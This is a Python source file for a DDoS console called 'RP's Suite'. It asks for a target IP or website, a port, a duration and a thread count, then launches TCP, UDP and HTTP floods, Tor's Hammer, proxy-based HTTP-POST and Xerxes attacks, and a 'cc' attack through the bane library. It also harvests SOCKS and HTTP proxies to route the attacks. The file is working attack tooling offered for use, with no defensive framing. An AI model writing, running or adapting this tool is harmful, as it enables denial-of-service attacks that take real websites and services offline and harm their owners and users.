#!/bin/python3

import pyfiglet
from colorama import Fore, Style
import os
import sys
import cc
import getpass
import platform
import socket
import requests, json



r = Fore.RED
b = Fore.BLUE
g = Fore.GREEN	
y = Fore.YELLOW
w = Fore.WHITE
m = Fore.MAGENTA
reset = Style.RESET_ALL



try:

	import bane

except:

	os.system("pip3 install bane")
	print(g + "[+] Modules successfully installed..")
	print(reset)
	sys.exit()


def banner():
	header_banner = pyfiglet.figlet_format("  RP's Suite  ")
	os.system("cls")
	print(r, header_banner)
	print(b, "#" + "-" * 80 + "#")

	print(b, "#" + "\t\t\t[+] OS Check : " + g, "{}" .format(sys.platform)) 
	print(b, "#\t\t\t[!] Tool coded by : " + g , "RP")
	print(b, "#\t\t[!] NOTE:" + r , "Enter 'help' in the console to show the help menu")

	print(b, "#" + "-" * 80 + "#")

	print(reset)



banner()

while True:
	console = input(Fore.CYAN + "kit0sec@root ~ : ")
	print(reset)

	if console == "help":
		print(b + "DDOS ~" + r , "Enter 'ddos' to show DDOS help menu")
		print(b + "Proxies ~ " + r , "Enter 'proxies' to show proxy gathering help menu")
		print(b + "Exit ~" + r , "Type 'exit' to exit the console ")
		print(b + "Clear ~" + r , "Type 'clear' to clear the screen ")
		print("")


	elif console == "Exit":
		print(b + "Script Terminated..." + g, "Goodbye")
		exit()

	elif console == "Clear":
		os.system("cls")
		banner()

	elif console == "DDOS":
		print(b + "TCP Flood:" + r , "Enter 'tcpflood' to start a TCP Flood DoS Attack")
		print(b + "UDP Flood:" + r , "Enter 'udpflood to start a UDP Flood DoS Attack")
		print(b + "HTTP Flood:" + r ,"Enter 'httpflood' to start a Normal HTTP-Flood DDOS Attack without proxies")
		print(b + "Proxy-HTTP Flood:" + r , "Enter 'proxyhttpflood' to start HTTP-Flood Attack with proxies")
		print(b + "Tor's Hammer:" + r , "Enter 'torshammer' to start HTTP-Post Attack  . ")
		print(b + "Proxy Hammer:" + r , "Enter 'proxyhammer' to start HTTP-Post Attack using proxies instead of tor ")
		print(b + "Proxy Xerxes:" + r, "Enter 'proxy_xerxes' to start xerxes attack using proxies ")
		print(y + "[!] EXCLUSIVE - CC ATTACK:" + r, "Enter 'cc' to start the EXCLUSIVE attack")
		print("")

	elif console == "Proxies":
		print(b + "HTTP_Proxy:" + r , "Enter 'http_proxy' to grab HTTP Proxies")
		print(b + "Socks_4 Proxy:" + r , "Enter 'socks4_proxy' to grab Socks_4 Proxies")
		print(b + "Socks_5 Proxy:" + r , "Enter 'socks5_proxy' to grab Socks_5 Proxies")
		print("")

	elif console == "tcpflood":
		target = str(input(Fore.CYAN + "[+] Enter a Target IP or the Website URL to attack : " ))
		port = int(input(Fore.CYAN + "[+] Enter the port number : " ))
		time = int(input(Fore.CYAN + "[+] Enter time duration for the attack : " ))
		th = int(input(Fore.CYAN + "[+] Enter number of threads : " ))
		print(reset)
		print(b + "[+] Attack Started TARGET  ->> {}" .format(target))
		bane.tcp_flood(target, p=port, min_size=10, max_size=20, interval=0.001, threads=th, timeout=5, duration=time, logs=True)

	elif console == "udpflood":
		ip = str(input(Fore.CYAN + "[+] Enter a Target IP or the Website name to attack :"))
		po = int(input(Fore.CYAN + "[+] Enter the port number : "))
		th = int(input(Fore.CYAN + "[+] Enter time duration for the attack : " ))
		print(reset)
		print(b + "[+] Attack Started  ->> {}" .format(ip))
		bane.udp_flood(ip, p=po, min_size=10, max_size=20, interval=0.001, duration=th,  logs=True)


	elif console == "httpflood":
		ip = str(input(Fore.CYAN + "[+] Enter a Target IP or the Website name to attack :"))
		po = int(input(Fore.CYAN + "[+] Enter the port number : " ))
		th = int(input(Fore.CYAN + "[+] Enter time duration for the attack : " ))
		threading = int(input(Fore.CYAN + "[+] Enter number of threads : " ))
		print(reset)
		print(b + "[+] Attack Started  ->> {}" .format(ip))
		bane.http_spam(ip, p=po, interval=0.001, threads=threading, timeout=5, duration=th, logs=True)

	elif console == "proxyhttpflood":
		target = str(input(Fore.CYAN + "[+] Enter a Target IP or the Website name to attack :"))
		port = int(input(Fore.CYAN + "[+] Enter the port number : " ))
		time = int(input(Fore.CYAN + "[+] Enter time duration for the attack : " ))
		th = int(input(Fore.CYAN + "[+] Enter number of threads : " ))
		print(reset)
		print(b + "[+] Attack Started  ->> {}" .format(target))
		bane.prox_http_spam(target, p=port, interval=0.001, threads=th, timeout=5, duration=time, logs=True)

	elif console == "torshammer":
		target = str(input(Fore.CYAN + "[+] Enter a Target IP or the Website name to attack :"))
		po = int(input(Fore.CYAN + "[+] Enter the port number : " ))
		th = int(input(Fore.CYAN + "[+] Enter time duration for the attack : " ))
		time = int(input(Fore.CYAN + "[+] Enter number of threads : " ))
		print(reset)
		print(b + "[+] Attack Started  ->> {}" .format(target))
		bane.torshammer(target, p=po, duration=time,  threads=th, timeout=5, logs=True)

	elif console == "proxyhammer":
		target = str(input(Fore.CYAN + "[+] Enter Target IP or website name  to attack : "))
		port = int(input(Fore.CYAN + "[+] Enter the port number : " ))
		time = int(input(Fore.CYAN + "[+] Enter time duration for the attack : " ))
		th = int(input(Fore.CYAN + "[+] Enter number of threads : " ))
		print(reset)
		print(b + "[+] Attack Started  ->> {}" .format(target))
		bane.prox_hammer(target, p=port, duration=time, threads=th, timeout=5, logs=True)

	elif console == "proxy_xerxes":
		target = str(input(Fore.CYAN + "[+] Enter a Target IP or the Website name to attack :"))
		port = int(input(Fore.CYAN + "[+] Enter the port number : " ))
		time = int(input(Fore.CYAN + "[+] Enter time duration for the attack : " ))
		th = int(input(Fore.CYAN + "[+] Enter number of threads : " ))
		print(reset)
		print(b + "[+] Attack Started  ->> {}" .format(target))
		bane.prox_xerxes(target, p=port, duration=time, threads=th, timeout=5, logs=True)


	elif console == "http_proxy":
		number = input(r + "[+] How many HTTP proxies do you want? : " )
		print(r + "[+] Finding HTTP proxies ...")
		print(reset)
		a = bane.masshttp(int(number))
		print(a)
	
	elif console == "socks4_proxy":
		no = input(r + "[+] How many Socks4 proxies do you want? : " )
		print(r + "[+] Finding Socks4 proxies ..")
		print(reset)
		proxy = bane.massocks4(int(no))
		print(proxy)
	elif console == "socks5_proxy":
		no = input(r + "[+] How many Socks5 proxies do you want? : " )
		print(r + "[+] Finding Socks5 proxies ..")	
		print(reset)
		proxy = bane.massocks5(int(no))
		print(proxy)


	elif console == "cc":
		cc.main()



	elif console == "":
		pass	
	

	else:
		print(b + "[!] Enter the right fucking command...")
		print(g + "[!] Enter 'help' to get a list.")
		print(reset)	